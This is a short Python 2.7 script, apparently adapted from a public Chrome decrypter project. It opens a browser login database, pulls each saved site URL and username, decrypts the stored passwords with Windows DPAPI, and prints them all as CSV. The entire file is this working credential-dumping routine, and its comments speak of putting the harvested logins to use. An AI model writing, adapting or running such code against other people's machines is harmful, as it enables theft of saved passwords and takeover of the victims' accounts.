import os
import sqlite3
import win32crypt #requires pypiwin32 module
import sys

#python 2.7
#based off of https://github.com/byt3bl33d3r/chrome-decrypter
#output is in csv format
try:
	path=sys.argv[1] #Get Path to SQL DB file
except IndexError:
	print("ERROR: No path given")
	sys.exit(1)

try:
	conn=sqlite3.connect(path) #Connect to sql db defined as argument
	cursor=conn.cursor() #Load cursor for sql
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")	#SQL Statement to grab the action_url, username, and password blob
	data=cursor.fetchall() #Get results of SQL Statement
except Exception, e: #Incase of error
	print("FATAL SQL ERROR: %s" % (e)) #Print the error
	sys.exit(1) #and Exit

if len(data)>0: #Are there any autosaves?
	for result in data: #Enumerate the autosaves
		try:
			password=win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1] #Gets password from data and ignores the description
			if(str(result[0])!="" or (str(result[1])!="" and str(result[2])!="") ): #Please tell me that i can use this username and password for something or there is a username and password
				print("%s,%s,%s" % (str(result[0]), str(result[1]), str(password))) #Print my stuff please
		except Exception, e:
			pass #skip record on error
			#error i dont care about be GONE!